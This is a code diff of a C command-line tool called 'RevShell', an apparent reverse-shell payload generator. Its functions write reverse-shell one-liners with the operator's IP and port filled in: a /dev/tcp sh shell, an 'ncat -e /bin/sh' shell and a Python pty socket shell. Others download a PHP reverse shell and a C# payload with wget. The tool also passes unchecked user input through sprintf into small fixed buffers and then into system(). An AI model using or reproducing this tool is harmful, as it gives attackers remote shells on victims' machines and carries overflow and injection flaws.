@@ -21,22 +21,23 @@ void GetNcat_Full_Cred();
 void GetC_Full_Cred();
 void GetPython_Full_Cred();
 
-// Main Function      *******************************************   Main Function \\ 
+ // Global Variables ***************************************** Global Variables \\ 
+
+char * argument1;
+char * argument;
+char * ip_port;
+char * ip_addr;
+char * argument_ip;
+
+// Main Function  *******************************************   Main Function \\ 
 
 int main(int argc , char* argv[])
 {
-	// Some Vars **************************************** Some Vars // 
-	char * argument1;
-	char * argument;
-	char * ip_port;
-	char * ip_addr;
-	char * argument_ip;
-
 	// If Statements ************************************* If Statements // 
 
 	if (argc < 2 || argc == 1)
 	{
-		printf("RevShell version 0.0.2\n\nUse -h or --help for help\n");
+		printf("RevShell version 0.0.3\n\nUse -h or --help for help\n");
 	}
 	else if ((strcmp(argv[1],"-h"))==0 || (strcmp(argv[1],"--help"))==0 )
 	{
@@ -78,28 +79,28 @@ int main(int argc , char* argv[])
 	}
 	else if ((strcmp(argv[1],"-t"))==0 && argc == 3 )
 	{
-		argument1 = argv[2];
-		if ((strcmp(argument1,"php")==0))
+		argument = argv[2];
+		if ((strcmp(argument,"php")==0))
 		{
 			GetPhp();
 		}
-		else if ((strcmp(argument1,"shell")==0))
+		else if ((strcmp(argument,"shell")==0))
 		{
 			GetShell();
 		}
-		else if ((strcmp(argument1,"csharp")==0))
+		else if ((strcmp(argument,"csharp")==0))
 		{
 			GetCsharp();
 		}		
-		else if ((strcmp(argument1,"ncat")==0))
+		else if ((strcmp(argument,"ncat")==0))
 		{
 			GetNcat();
 		}
-		else if ((strcmp(argument1,"c")==0))
+		else if ((strcmp(argument,"c")==0))
 		{
 			GetC();
 		}
-		else if ((strcmp(argument1,"python")==0))
+		else if ((strcmp(argument,"python")==0))
 		{
 			GetPython();
 		}
@@ -133,9 +134,7 @@ int main(int argc , char* argv[])
 		}		
 		else if ((strcmp(argument_ip,"ncat")==0))
 		{
-			printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
-			system("echo \"Victim : ncat -e /bin/sh <ip> <port> \nListener : ncat -lnvp <port>\" > ncat_help.txt \n");
-
+			GetNcat_Full_Cred();
 		}	
 		else if ((strcmp(argument_ip,"c")==0))
 		{
@@ -174,9 +173,7 @@ int main(int argc , char* argv[])
 		}		
 		else if ((strcmp(argument_ip,"ncat")==0))
 		{
-			printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
-			system("echo \"Victim : ncat -e /bin/sh <ip> <port> \nListener : ncat -lnvp <port>\" > ncat_help.txt \n");
-
+			GetNcat_Full_Cred();
 		}	
 		else if ((strcmp(argument_ip,"c")==0))
 		{
@@ -200,7 +197,7 @@ int main(int argc , char* argv[])
 		argument_ip = argv[2];
 		ip_addr = argv[4];
 		ip_port = argv[6]; 
-
+	
 
 		if ((strcmp(argument_ip,"php")==0))
 		{
@@ -216,9 +213,7 @@ int main(int argc , char* argv[])
 		}		
 		else if ((strcmp(argument_ip,"ncat")==0))
 		{
-			printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
-			system("echo \"Victim : ncat -e /bin/sh <ip> <port> \nListener : ncat -lnvp <port>\" > ncat_help.txt \n");
-
+			GetNcat_Full_Cred();
 		}	
 		else if ((strcmp(argument_ip,"c")==0))
 		{
@@ -257,9 +252,7 @@ int main(int argc , char* argv[])
 		}		
 		else if ((strcmp(argument_ip,"ncat")==0))
 		{
-			printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
-			system("echo \"Victim : ncat -e /bin/sh <ip> <port> \nListener : ncat -lnvp <port>\" > ncat_help.txt \n");
-
+			GetNcat_Full_Cred();
 		}	
 		else if ((strcmp(argument_ip,"c")==0))
 		{
@@ -299,9 +292,7 @@ int main(int argc , char* argv[])
 		}		
 		else if ((strcmp(argument_ip,"ncat")==0))
 		{
-			printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
-			system("echo \"Victim : ncat -e /bin/sh <ip> <port> \nListener : ncat -lnvp <port>\" > ncat_help.txt \n");
-
+			GetNcat_Full_Cred();
 		}	
 		else if ((strcmp(argument_ip,"c")==0))
 		{
@@ -340,9 +331,7 @@ int main(int argc , char* argv[])
 		}		
 		else if ((strcmp(argument_ip,"ncat")==0))
 		{
-			printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
-			system("echo \"Victim : ncat -e /bin/sh <ip> <port> \nListener : ncat -lnvp <port>\" > ncat_help.txt \n");
-
+			GetNcat_Full_Cred();
 		}	
 		else if ((strcmp(argument_ip,"c")==0))
 		{
@@ -382,9 +371,7 @@ int main(int argc , char* argv[])
 		}		
 		else if ((strcmp(argument_ip,"ncat")==0))
 		{
-			printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
-			system("echo \"Victim : ncat -e /bin/sh <ip> <port> \nListener : ncat -lnvp <port>\" > ncat_help.txt \n");
-
+			GetNcat_Full_Cred();
 		}	
 		else if ((strcmp(argument_ip,"c")==0))
 		{
@@ -417,25 +404,24 @@ int main(int argc , char* argv[])
 
 void PrintHelp()
 {
-	printf("Usage : ./program [OPTION] .. [FILE]\n\nOptions :\n\n-h --help print this help page\n-t --type <php,csharp,shell,c,ncat>\n-o --output output file\n-p --port specify a port number <1 to 65,535>\n\nLong Options :\n--ip specify an ip address\n\nContact me when you find bugs <mrtankgt@outlook.com> MrEbrahimXD\n");
+	printf("Usage : ./program [OPTION] .. [FILE]\n\nOptions :\n\n-h --help print this help page\n-t --type <php,csharp,shell,c,ncat>\n-o --output output file\n-p --port specify a port number <1 to 65,535>\n\nLong Options :\n\n--ip specify an ip address <bash , ncat , python > later updates\n\nContact me when you find bugs <mrtankgt@outlook.com> MrEbrahimXD\n");
 }
 
 void GetPhp()
 {
-	printf("[*] Php RevShell Copied to current dir at <place>\n\n");
-	// Php Reverse shell by pentest monkey <pentestmonkey.com>
+	printf("[*] Php RevShell Copied to current dir \n\n");
 	system("wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php \n");
 }
 
 void GetShell()
 {
-	printf("[*] Made shell_revshell.txt UDP and TCP Change Ip and Port at <place>\n");
-	system("echo \"sh -i >& /dev/tcp/<ip>/<port> 0>&1\" > shell_revshell_tcp.txt && echo \"sh -i >& /dev/tcp/<ip>/<port> 0>&1\" > shell_revshell_udp.txt \n\n");
+	printf("[*] Made shell_revshell.txt UDP and TCP Change Ip and Port \n");
+	system("echo \"Victim : sh -i >& /dev/tcp/<ip>/<port> 0>&1\nAttacker : nc -lnvp <port>\" > shell_revshell_tcp.txt && echo \"Victim : sh -i >& /dev/udp/<ip>/<port> 0>&1\nAttacker : nc -lnvp <port>\" > shell_revshell_udp.txt \n\n");
 }
 
 void GetCsharp()
 {
-	printf("[*] Made C# script at <place> \n");
+	printf("[*] Made C# script at current dir \n");
 	system("wget https://raw.githubusercontent.com/MrEbrahimXD/Raw-For-Revshell/main/csharp.cs \n");
 }
 
@@ -458,17 +444,9 @@ void GetPython()
 }
 
 
-
-// IP Functions *********************************************************************** IP Functions \\ 
-
-// ##############################
-/* argument_ip = argv[2];
-		ip_addr = argv[4];
-		ip_port = argv[6];
-*/
-// ###############################
-
-
+// ****************************************************************************************************** \\ 
+// IP Functions ---------------------------------------------------------------------------- IP Functions \\ 
+// ****************************************************************************************************** \\ 
 
 void GetPhp_Full_Cred()
 {
@@ -477,6 +455,10 @@ void GetPhp_Full_Cred()
 
 void GetShell_Full_Cred()
 {
+	char cmd[192];
+	printf("[*] Made shell_revshell.txt UDP and TCP with %s:%s\n" , ip_addr , ip_port );
+	sprintf(cmd , "echo \"Victim : sh -i >& /dev/tcp/%s/%s 0>&1\nAttacker : nc -lnvp %s\" > shell_revshell_tcp.txt && echo \"Victim : sh -i >& /dev/udp/%s/%s 0>&1\nAttacker : nc -lnvp %s\" > shell_revshell_udp.txt \n\n" , ip_addr , ip_port , ip_port , ip_addr , ip_port , ip_port);
+	system(cmd);
 
 }
 
@@ -487,7 +469,10 @@ void GetCsharp_Full_Cred()
 
 void GetNcat_Full_Cred()
 {
-
+	char cmd[86];
+	printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
+	sprintf(cmd , "echo \"Victim : ncat -e /bin/sh %s %s \nListener : ncat -lnvp %s\" > ncat_help.txt \n" , ip_addr , ip_port , ip_port );
+	system(cmd);
 }
 
 void GetC_Full_Cred()
@@ -497,13 +482,22 @@ void GetC_Full_Cred()
 
 void GetPython_Full_Cred()
 {
-
+	char cmd[159];
+	printf("[*] Python : python_revshell.txt made with %s:%s \n" , ip_addr , ip_port);
+	sprintf(cmd , "echo \"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'\" > python_revshell.txt \n" , ip_addr , ip_port );
+	system(cmd);
 }
+// **************************************************************************************** \\ 
 
 
-// ##############################
-/* 	argument_ip = argv[2];
-	ip_addr = argv[4];
-	ip_port = argv[6];
-*/
-// ###############################
+
+
+
+// Instant RevShells **************************************** Instant RevShells \\ 
+
+// void functions_for_instant_revshells()
+// {
+
+// }
+
+// ****************************************************************************  \\ 
